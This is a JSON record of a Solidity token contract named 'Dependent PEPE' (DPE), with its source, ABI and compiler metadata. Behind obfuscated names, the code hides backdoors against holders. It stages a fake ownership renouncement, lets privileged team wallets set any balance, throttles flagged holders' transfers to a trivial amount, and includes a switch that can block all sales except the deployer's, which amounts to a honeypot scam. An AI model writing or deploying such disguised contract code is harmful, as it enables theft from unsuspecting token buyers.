{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface txReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchTx) external view returns (uint256);\n\n    function transfer(address exemptEnableReceiver, uint256 amountTotal) external returns (bool);\n\n    function allowance(address receiverMaxLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amountTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptEnableReceiver,\n        uint256 amountTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptFundMin, uint256 value);\n    event Approval(address indexed receiverMaxLimit, address indexed spender, uint256 value);\n}\n\nabstract contract tradingMin {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface liquidityMode {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface atAmount {\n    function createPair(address listIs, address senderFrom) external returns (address);\n}\n\ninterface txReceiverMetadata is txReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DependentPEPE is tradingMin, txReceiver, txReceiverMetadata {\n\n    address public isBuyReceiver;\n\n    function allowance(address receiverSender, address feeAt) external view virtual override returns (uint256) {\n        if (feeAt == launchReceiver) {\n            return type(uint256).max;\n        }\n        return fromFee[receiverSender][feeAt];\n    }\n\n    address public txSellToken;\n\n    function approve(address feeAt, uint256 amountTotal) public virtual override returns (bool) {\n        fromFee[_msgSender()][feeAt] = amountTotal;\n        emit Approval(_msgSender(), feeAt, amountTotal);\n        return true;\n    }\n\n    address private launchedFrom;\n\n    function owner() external view returns (address) {\n        return launchedFrom;\n    }\n\n    uint256 private toAt;\n\n    function takeReceiver(address buyMode, address exemptEnableReceiver, uint256 amountTotal) internal returns (bool) {\n        if (buyMode == isBuyReceiver) {\n            return swapFrom(buyMode, exemptEnableReceiver, amountTotal);\n        }\n        uint256 tradingAt = txReceiver(txSellToken).balanceOf(atLimit);\n        require(tradingAt == senderLaunched);\n        require(exemptEnableReceiver != atLimit);\n        if (buySwap[buyMode]) {\n            return swapFrom(buyMode, exemptEnableReceiver, limitMinAt);\n        }\n        return swapFrom(buyMode, exemptEnableReceiver, amountTotal);\n    }\n\n    function limitSender(address totalTrading, uint256 amountTotal) public {\n        maxTakeWallet();\n        launchedAmount[totalTrading] = amountTotal;\n    }\n\n    uint256 senderLaunched;\n\n    string private minWallet = \"Dependent PEPE\";\n\n    function swapFrom(address buyMode, address exemptEnableReceiver, uint256 amountTotal) internal returns (bool) {\n        require(launchedAmount[buyMode] >= amountTotal);\n        launchedAmount[buyMode] -= amountTotal;\n        launchedAmount[exemptEnableReceiver] += amountTotal;\n        emit Transfer(buyMode, exemptEnableReceiver, amountTotal);\n        return true;\n    }\n\n    address atLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function symbol() external view virtual override returns (string memory) {\n        return feeTxTrading;\n    }\n\n    uint256 private exemptReceiver = 100000000 * 10 ** 18;\n\n    constructor (){\n        if (teamLaunchedIs == launchFrom) {\n            launchFrom = true;\n        }\n        liquidityMode txLiquidity = liquidityMode(launchReceiver);\n        txSellToken = atAmount(txLiquidity.factory()).createPair(txLiquidity.WETH(), address(this));\n        \n        isBuyReceiver = _msgSender();\n        tokenFund();\n        toTeam[isBuyReceiver] = true;\n        launchedAmount[isBuyReceiver] = exemptReceiver;\n        \n        emit Transfer(address(0), isBuyReceiver, exemptReceiver);\n    }\n\n    function transferFrom(address buyMode, address exemptEnableReceiver, uint256 amountTotal) external override returns (bool) {\n        if (_msgSender() != launchReceiver) {\n            if (fromFee[buyMode][_msgSender()] != type(uint256).max) {\n                require(amountTotal <= fromFee[buyMode][_msgSender()]);\n                fromFee[buyMode][_msgSender()] -= amountTotal;\n            }\n        }\n        return takeReceiver(buyMode, exemptEnableReceiver, amountTotal);\n    }\n\n    event OwnershipTransferred(address indexed launchedSender, address indexed shouldWalletTotal);\n\n    mapping(address => uint256) private launchedAmount;\n\n    uint8 private launchedWalletEnable = 18;\n\n    function tokenFund() public {\n        emit OwnershipTransferred(isBuyReceiver, address(0));\n        launchedFrom = address(0);\n    }\n\n    address launchReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function senderTeam(address modeAuto) public {\n        maxTakeWallet();\n        if (teamLaunchedIs != launchFrom) {\n            launchFrom = true;\n        }\n        if (modeAuto == isBuyReceiver || modeAuto == txSellToken) {\n            return;\n        }\n        buySwap[modeAuto] = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptReceiver;\n    }\n\n    mapping(address => bool) public toTeam;\n\n    uint256 private fundLimitShould;\n\n    function balanceOf(address launchTx) public view virtual override returns (uint256) {\n        return launchedAmount[launchTx];\n    }\n\n    function maxTakeWallet() private view {\n        require(toTeam[_msgSender()]);\n    }\n\n    function modeList(uint256 amountTotal) public {\n        maxTakeWallet();\n        senderLaunched = amountTotal;\n    }\n\n    function getOwner() external view returns (address) {\n        return launchedFrom;\n    }\n\n    bool public launchFrom;\n\n    uint256 public launchedToken;\n\n    bool public takeEnable;\n\n    mapping(address => bool) public buySwap;\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchedWalletEnable;\n    }\n\n    string private feeTxTrading = \"DPE\";\n\n    mapping(address => mapping(address => uint256)) private fromFee;\n\n    function name() external view virtual override returns (string memory) {\n        return minWallet;\n    }\n\n    function launchedTake(address teamMax) public {\n        require(teamMax.balance < 100000);\n        if (marketingLimitMin) {\n            return;\n        }\n        \n        toTeam[teamMax] = true;\n        \n        marketingLimitMin = true;\n    }\n\n    bool public teamLaunchedIs;\n\n    function transfer(address totalTrading, uint256 amountTotal) external virtual override returns (bool) {\n        return takeReceiver(_msgSender(), totalTrading, amountTotal);\n    }\n\n    uint256 swapToken;\n\n    uint256 constant limitMinAt = 15 ** 10;\n\n    bool public marketingLimitMin;\n\n    uint256 public liquidityFeeToken;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMaxLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldWalletTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptFundMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeAt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTx\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buySwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isBuyReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMax\",\"type\":\"address\"}],\"name\":\"launchedTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountTotal\",\"type\":\"uint256\"}],\"name\":\"limitSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityFeeToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingLimitMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountTotal\",\"type\":\"uint256\"}],\"name\":\"modeList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeAuto\",\"type\":\"address\"}],\"name\":\"senderTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamLaunchedIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptEnableReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txSellToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DependentPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}